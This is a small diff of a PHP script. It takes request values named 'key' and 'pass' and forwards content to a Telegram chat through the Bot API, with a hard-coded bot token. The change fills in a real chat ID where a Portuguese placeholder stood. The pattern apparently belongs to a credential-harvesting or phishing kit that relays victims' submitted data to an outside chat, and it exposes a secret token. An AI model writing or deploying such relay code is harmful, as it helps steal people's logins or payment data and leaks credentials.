@@ -44,7 +44,7 @@ if (isset($_GET['key']) && isset($_GET['pass']) && isset($_GET['val']) && isset(
 
         $botToken = '8107256504:AAHfce8LiU6FYahdzTLH3zNKPFIN1FjIduA';
         
-        $chatId = 'seu id aqui';
+        $chatId = '7884423447';
 
         $mensagem = urlencode($conteudo);
         $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
